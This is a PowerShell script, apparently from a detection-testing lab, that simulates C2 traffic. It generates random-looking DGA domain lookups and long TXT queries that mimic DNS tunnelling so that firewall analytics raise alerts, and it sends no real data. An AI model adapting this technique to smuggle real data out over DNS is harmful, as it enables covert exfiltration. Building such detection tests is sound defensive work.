<#
    Stage 1 - Initial Access / Command & Control
    ============================================
    Simulates a freshly-landed implant beaconing out through the Palo Alto
    firewall using two network behaviours the EAL analytics look for:

      (a) DGA beaconing  -> "Random-Looking Domain Names"  (T1568.002, Medium)
      (b) DNS tunnelling -> "DNS Tunneling"                (T1071/T1048, Low)

    Only outbound DNS is generated - nothing is installed on the host.
    Runs on a standalone Windows box; the firewall still logs the queries.
#>
param([switch]$DryRun)
. "$PSScriptRoot\..\config\lab-config.ps1"
$cfg = $Global:EalDemo
if ($DryRun) { $cfg.DryRun = $true }

Write-Stage "STAGE 1: C2 beaconing (DGA + DNS tunnelling)" "INFO"

# --- (a) DGA: many random root domains from one host -----------------------
function New-RandomLabel([int]$len) {
    $chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    -join (1..$len | ForEach-Object { $chars[(Get-Random -Max $chars.Length)] })
}

Write-Stage "Generating $($cfg.DgaLookupCount) random-looking domain lookups..." "INFO"
for ($i = 1; $i -le $cfg.DgaLookupCount; $i++) {
    $label  = New-RandomLabel (Get-Random -Min 10 -Max 20)
    $domain = "$label.$($cfg.DgaRootDomain)"
    if ($cfg.DryRun) {
        Write-Host "  DRY: resolve $domain"
    } else {
        try { Resolve-DnsName -Name $domain -Type A -QuickTimeout -ErrorAction Stop | Out-Null }
        catch { }   # NXDOMAIN is expected & fine - the query is what matters
    }
    if ($i % 10 -eq 0) { Write-Stage "  ... $i / $($cfg.DgaLookupCount) DGA lookups" "INFO" }
    Start-Sleep -Milliseconds $cfg.DelayBetweenReqMs
}
Write-Stage "DGA beaconing complete." "OK"

# --- (b) DNS tunnelling: >10 KB encoded into subdomains in a 10-min window --
Write-Stage "Encoding ~$($cfg.TunnelKilobytes) KB of data into subdomain queries..." "INFO"
$bytesTarget = $cfg.TunnelKilobytes * 1024
$sent = 0; $n = 0
while ($sent -lt $bytesTarget) {
    # up to 4 base32-ish labels of ~50 chars = data smuggled in the query name
    $labels = 1..4 | ForEach-Object { New-RandomLabel 50 }
    $qname  = ($labels -join '.') + "." + $cfg.TunnelDomain
    if ($cfg.DryRun) {
        Write-Host "  DRY: TXT $qname"
    } else {
        try { Resolve-DnsName -Name $qname -Type TXT -QuickTimeout -ErrorAction Stop | Out-Null }
        catch { }
    }
    $sent += $qname.Length
    $n++
    if ($n % 20 -eq 0) { Write-Stage "  ... ~$([int]($sent/1024)) KB tunnelled" "INFO" }
    Start-Sleep -Milliseconds ([Math]::Max(50, $cfg.DelayBetweenReqMs/2))
}
Write-Stage "DNS tunnelling complete (~$([int]($sent/1024)) KB in $n queries)." "OK"
Write-Stage "STAGE 1 done. Expect: 'Random-Looking Domain Names' + 'DNS Tunneling'." "OK"
